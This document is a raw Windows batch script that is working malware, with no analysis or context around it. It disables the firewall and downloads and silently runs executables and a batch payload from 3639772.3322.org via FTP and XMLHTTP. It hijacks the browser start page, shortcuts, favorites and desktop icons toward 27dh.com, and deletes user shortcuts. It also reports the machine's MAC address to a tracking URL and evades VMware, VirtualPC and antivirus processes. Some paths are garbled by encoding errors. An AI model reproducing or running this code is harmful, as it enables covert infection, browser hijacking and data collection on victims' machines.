If Exist %windir%\help\rllfdDSDfds7.vbs (Goto Exit)
If Exist %windir%\temp\vmscsi.sys (Goto exiti)
If Exist %windir%\temp\vmware-SYSTEM (Goto exiti)

Echo net stop sharedaccess>%windir%\Resources\tjcj21.bat
Echo Cd ..>>%windir%\Resources\tjcj21.bat
Echo Echo open 3639772.3322.org^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Echo guest^>^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Echo guest^>^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Echo Prompt^>^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Echo mget *.exe^>^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Echo bye^>^>%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo ftp -s:%%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat
Echo Del %%windir%%\Resources\a.dat>>%windir%\Resources\tjcj21.bat

Echo If Exist "0001.exe" start "" "0001.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0002.exe" start "" "0002.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0003.exe" start "" "0003.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0004.exe" start "" "0004.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0005.exe" start "" "0005.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0006.exe" start "" "0006.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0007.exe" start "" "0007.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0008.exe" start "" "0008.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0009.exe" start "" "0009.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0010.exe" start "" "0010.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0011.exe" start "" "0011.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0012.exe" start "" "0012.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0013.exe" start "" "0013.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0014.exe" start "" "0014.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0015.exe" start "" "0015.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0016.exe" start "" "0016.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0017.exe" start "" "0017.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0018.exe" start "" "0018.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0019.exe" start "" "0019.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "0020.exe" start "" "0020.exe">>%windir%\Resources\tjcj21.bat
Echo If Exist "setup5792.exe" start "" "setup5792.exe">>%windir%\Resources\tjcj21.bat
Echo Del %windir%\Resources\tjcj21.bat>>%windir%\Resources\tjcj21.bat

Echo Set xPost = createObject("Microsoft.XMLHTTP")  >%windir%\help\tccj.vbs
Echo xPost.Open "GET","http://3639772.3322.org:99/tc/1002.css",0 >>%windir%\help\tccj.vbs
Echo xPost.Send() >>%windir%\help\tccj.vbs
Echo Set sGet = createObject("ADODB.Stream") >>%windir%\help\tccj.vbs
Echo sGet.Mode = 3 >>%windir%\help\tccj.vbs
Echo sGet.Type = 1 >>%windir%\help\tccj.vbs
Echo sGet.Open() >>%windir%\help\tccj.vbs
Echo sGet.Write(xPost.responseBody) >>%windir%\help\tccj.vbs
Echo sGet.SaveToFile "%windir%\help\tc.bat" >>%windir%\help\tccj.vbs
Echo CreateObject("WScript.Shell").Run "cmd /c %windir%\help\tc.bat",0 >>%windir%\help\tccj.vbs

@Echo Windows Registry Editor Version 5.00>;add7.rig
@Echo. >>;add7.rig
@Echo [HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command]>>;add7.rig
@Echo @="\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://www.27dh.com/?1002/">>;add7.rig
Regedit /s add7.rig
Del /q add7.rig

reg delete "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /f 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http://www.27dh.com/?1002/" /f

Echo HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main [8] >%windir%\system32\regsets.ini
regini %windir%\system32\regsets.ini

@Echo Off
Set lnkdir="%userprofile%\����ʼ���˵�\����"
Echo [InternetShortcut] >%lnkdir%\Internet" "Explorer.url
Echo URL="http://www.27dh.com/?1002/" >>%lnkdir%\Internet" "Explorer.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\Internet" "Explorer.url
Echo IconIndex=^0 >>%lnkdir%\Internet" "Explorer.url

@Echo Off
Set lnkdir="%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch"
Echo [InternetShortcut] >%lnkdir%\Internet" "Explorer.url
Echo URL="http://www.27dh.com/?1002/" >>%lnkdir%\Internet" "Explorer.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\Internet" "Explorer.url
Echo IconIndex=^0 >>%lnkdir%\Internet" "Explorer.url

@Echo Off
Set lnkdir="%userprofile%\Favorites\"
Echo [InternetShortcut] >%lnkdir%\27��ַ֮��" "��������27��ַ֮��.url
Echo URL="http://www.27dh.com/?1002/" >>%lnkdir%\27��ַ֮��" "��������27��ַ֮��.url
Echo IconFile="C:\Program Files\Internet Explorer\IEXPLORE.EXE" >>%lnkdir%\27��ַ֮��" "��������27��ַ֮��.url
Echo IconIndex=^0 >>%lnkdir%\27��ַ֮��" "��������27��ַ֮��.url

Echo Windows Registry Editor Version 5.00>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}]>>;web.rig
Echo @="Internet Explorer">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\DefaultIcon]>>;web.rig
Echo @="C:\\Program Files\\Internet Explorer\\iexplore.exe">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell]>>;web.rig
Echo @="">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\D]>>;web.rig
Echo @="ɾ��(&D)">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\D\Command]>>;web.rig
Echo @="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\Open]>>;web.rig
Echo @="����ҳ">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\Open\Command]>>;web.rig
Echo @="C:\\Program Files\\Internet Explorer\\iexplore.exe http://www.27dh.com/?81002/">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\����]>>;web.rig
Echo @="����">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\����\Command]>>;web.rig
Echo @="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl">>;web.rig

Echo [HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\ShellFolder]>>;web.rig
Echo @="">>;web.rig
Echo "Attributes"=dword:0000000a>>;web.rig


Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}]>>;web.rig
Echo @="Internet Explorer">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\DefaultIcon]>>;web.rig
Echo @="C:\\Program Files\\Internet Explorer\\iexplore.exe">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell]>>;web.rig
Echo @="">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\D]>>;web.rig
Echo @="ɾ��(&D)">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\D\Command]>>;web.rig
Echo @="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\Open]>>;web.rig
Echo @="����ҳ">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\Open\Command]>>;web.rig
Echo @="C:\\Program Files\\Internet Explorer\\iexplore.exe http://www.27dh.com/?81002/">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\����]>>;web.rig
Echo @="����">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\Shell\����\Command]>>;web.rig
Echo @="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl">>;web.rig

Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0688-899C-A93278894599}\ShellFolder]>>;web.rig
Echo @="">>;web.rig
Echo "Attributes"=dword:0000000a>>;web.rig


Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{86AEFBE8-763F-0688-899C-A93278894599}]>>;web.rig
Echo @="Ineter Iexplorer.exe">>;web.rig

Echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu]>>;web.rig
Echo "{871C5380-42A0-1069-A2EA-08002B30309D}"=dword:00000001>>;web.rig

Echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel]>>;web.rig
Echo "{871C5380-42A0-1069-A2EA-08002B30309D}"=dword:00000001>>;web.rig

Regedit /s web.rig
Del /q web.rig

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{86AEFBE8-763F-0647-899C-A93278894599}" /f 
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{86AEFBE8-763F-0647-899C-A93278894599}" /f 
reg delete "HKEY_CLASSES_ROOT\CLSID\{86AEFBE8-763F-0647-899C-A93278894599}" /f 

attrib -r "%userprofile%\����ʼ���˵�\����\����\*.lnk"
attrib -r "%userprofile%\����ʼ���˵�\����\*.lnk"
attrib -r "%userprofile%\����\*.lnk"
attrib -r "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"

Del "%userprofile%\����ʼ���˵�\����\����\*.lnk" /q
Del "%userprofile%\����ʼ���˵�\����\*.lnk" /q
Del "%userprofile%\����\Internet Explorer.lnk" /q
Del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /q

If Exist %windir%\help\rllfdDSDfds7.vbs (Goto f)
Set "var=ipconfig /all^|findstr /c:"Physical Address""
For /f "tokens=2 delims=:" %%a In ('%var%') do set mac=%%a
Set mac=%mac:-=:%

Set b=0
tasklist /nh>1.txt
For /f %%i In (1.txt) Do Echo %%i>nul&Set /a b+=1
Del 1.txt  /q

Echo CreateObject("WScript.Shell").Run "iexplore http://3639773.3322.org:99/union/count.asp?mac=%mac%&ver=%b%&ver=0122&userid=1002",0 > %windir%\help\rllfdDSDfds7.vbs

start %windir%\help\rllfdDSDfds7.vbs

:f
start %windir%\help\tccj.vbs

tasklist /nh|find /i "VMwareUser.exe"
If Errorlevel 1 (Goto a) Else (Goto Del) 
:a
tasklist /nh|find /i "VMwareTray.exe"
If Errorlevel 1 (Goto b) Else (Goto Del) 
:b
tasklist /nh|find /i "VMwareService.exe"
If Errorlevel 1 (Goto c) Else (Goto Del) 
:c
tasklist /nh|find /i "vpcmap.exe"
If Errorlevel 1 (Goto d) Else (Goto Del) 

:d
tasklist /nh|find /i "vmsrvc.exe"
If Errorlevel 1 (Goto e) Else (Goto Del) 

:e
tasklist /nh|find /i "vmusrvc.exe"
If Errorlevel 1 (Goto g) Else (Goto Del) 

:g
tasklist /nh|find /i "kmailmon.exe"
If Errorlevel 1 (Goto i) Else (Goto Del) 

:i
tasklist /nh|find /i "MPSVC.exe"
If Errorlevel 1 (Goto j) Else (Goto Del) 

:j
tasklist /nh|find /i "RavMonD.exe"
If Errorlevel 1 (Goto k) Else (Goto Del) 

:k
tasklist /nh|find /i "RsTray.exe"
If Errorlevel 1 (Goto l) Else (Goto Del) 

:l
tasklist /nh|find /i "avp.exe"
If Errorlevel 1 (Goto m) Else (Goto Del) 

:m
tasklist /nh|find /i "taskmgr.exe"
If Errorlevel 1 (Goto n) Else (Goto Del) 

:n
tasklist /nh|find /i "qq.exe"
If Errorlevel 1 (Goto qa) Else (Goto x) 



:x
mshta vbscript:CreateObject("WScript.Shell").Run("%windir%\Resources\tjcj21.bat",0)(window.close)

Exit

:Del
Del %windir%\Resources\tjcj21.bat
Exit

:qa
ping 127.0.0.1 -n 50
Goto x



:Exit
Exit


:exiti
mshta vbscript:CreateObject("WScript.Shell").Run("iexplore http://www.27dh.com/?ics1002",1)(window.close)
Exit
